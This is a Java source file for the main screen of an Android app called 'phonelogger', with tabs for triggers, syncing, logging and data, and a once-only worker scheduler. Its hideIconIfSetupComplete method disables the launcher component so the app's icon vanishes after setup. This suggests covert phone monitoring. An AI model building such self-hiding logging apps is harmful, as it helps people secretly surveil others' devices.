package com.phonelogger.ui;

import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;

import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;

import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.phonelogger.R;
import com.phonelogger.ui.fragments.AppFragment;
import com.phonelogger.ui.fragments.DataFragment;
import com.phonelogger.ui.fragments.LoggingFragment;
import com.phonelogger.ui.fragments.SyncFragment;
import com.phonelogger.ui.fragments.TriggerFragment;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Window w = getWindow();
        w.setStatusBarColor(0xFF000000);
        w.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        setContentView(R.layout.activity_main);

        setupBottomNav();

        // Start on Trigger tab
        if (savedInstanceState == null) {
            loadFragment(new TriggerFragment());
        }

        scheduleWorkersIfNeeded();
    }

    private void setupBottomNav() {
        BottomNavigationView nav = findViewById(R.id.bottom_nav);
        nav.setOnItemSelectedListener(item -> {
            Fragment fragment;
            int id = item.getItemId();
            if (id == R.id.nav_trigger) {
                fragment = new TriggerFragment();
            } else if (id == R.id.nav_sync) {
                fragment = new SyncFragment();
            } else if (id == R.id.nav_logging) {
                fragment = new LoggingFragment();
            } else if (id == R.id.nav_data) {
                fragment = new DataFragment();
            } else if (id == R.id.nav_app) {
                fragment = new AppFragment();
            } else {
                return false;
            }
            loadFragment(fragment);
            return true;
        });
    }

    private void loadFragment(Fragment fragment) {
        getSupportFragmentManager()
                .beginTransaction()
                .replace(R.id.fragment_container, fragment)
                .commit();
    }

    private void scheduleWorkersIfNeeded() {
        SharedPreferences prefs = getSharedPreferences("phonelogger", MODE_PRIVATE);
        if (prefs.getBoolean("workers_scheduled", false)) return;

        WorkerScheduler.scheduleAll(this);
        prefs.edit().putBoolean("workers_scheduled", true).apply();
    }

    public void hideIconIfSetupComplete() {
        SharedPreferences prefs = getSharedPreferences("phonelogger", MODE_PRIVATE);
        boolean setupComplete = prefs.getBoolean("setup_complete", false);
        boolean triggerConfigured = prefs.getBoolean("trigger_configured", false);

        if (setupComplete && triggerConfigured) {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }
    }
}
